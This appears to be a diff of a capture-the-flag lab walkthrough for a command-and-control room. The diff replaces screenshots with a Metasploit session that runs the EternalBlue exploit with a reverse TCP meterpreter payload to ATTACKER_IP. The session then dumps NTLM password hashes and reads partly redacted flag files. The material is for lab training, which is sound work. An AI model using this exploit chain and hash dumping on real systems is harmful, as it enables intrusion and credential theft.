@@ -412,11 +412,42 @@ Now that you have learned how to exploit hosts using Armitage, you will now get 
 #### Solution
 If you are having difficulties with compromising the machine, here's a step-by-step guide to compromise the VM with Metasploit. If you would like to use Armitage, use this [guide that shows step-by-step](https://drive.google.com/file/d/1u-YmWl7cx3tO2vVjon0EtOGLXVCak2SJ/view?usp=sharing) instructions. Now onto Metasploit!  
 Our first step is to launch Metasploit:  
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_40.png" width="50%" height="50%">  
+```
+root@attackbox$ msfconsole -q
+msf5 > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set LHOST eth0
+LHOST => eth0
+msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOST VICTIM_IP
+RHOST => VICTIM_IP
+msf5 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on ATTACKER_IP:4444 
+[*] VICTIM_IP:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] VICTIM_IP:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Home Basic 7600 x64 (64-bit)
+[*] VICTIM_IP:445      - Scanned 1 of 1 hosts (100% complete)
+[*] VICTIM_IP:445 - Connecting to target for exploitation.
+[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] VICTIM_IP:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+```
 Now that we have exploited the Virtual Machine and have achieved System level access, we can use the hashdump command to retrieve the users NTLM hashes:  
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_41.png" width="50%" height="50%">  
+```
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:c156d5d<snip!>4d6e0943c:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae93<snip!>d7e0c089c0:::
+Ted:1001:aad3b435b51404eeaad3b435b51404ee:2e2618f266da8867<snip!>5c1309a5c:::
+meterpreter > 
+```
 All that is left is to now retrieve the flags in the user's Home folders:  
-<img src="https://github.com/mylovemyon/TryHackMe_Images/blob/main/Images/Intro%20to%20C2_42.png" width="50%" height="50%">  
+```
+meterpreter > cat C:/Users/Administrator/Desktop/root.txt
+THM{bd6ea6c87<snip!>21081132744}
+meterpreter > cat C:/Users/Ted/Desktop/user.txt
+THM{217fa45e3<snip!>fc0be28e760} 
+```
 And that's all there is to it! You have successfully compromised Ted's PC.
 
 ----------------------------------------Answer the questions below--------------------------------------------------  
